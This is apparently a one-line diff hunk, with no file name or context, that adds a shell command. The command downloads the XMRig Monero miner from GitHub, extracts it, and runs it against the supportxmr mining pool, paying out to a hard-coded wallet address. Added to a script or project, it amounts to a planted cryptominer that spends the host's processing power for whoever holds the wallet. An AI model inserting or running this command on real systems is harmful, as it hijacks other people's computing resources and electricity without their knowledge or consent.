@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.2.2/xmrig-6.2.2-xenial-x64.tar.gz && tar xf xmrig-6.2.2-xenial-x64.tar.gz && cd xmrig-6.2.2 && ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 45gEJZpMzxqcBhfWhx7EJS9hE6eLm3j3L7XPdmHPzLPeiM6CYrHqRnG9TFrMYjdH94JquYyeV4waVBsZdiZFir7n3PFUsYc
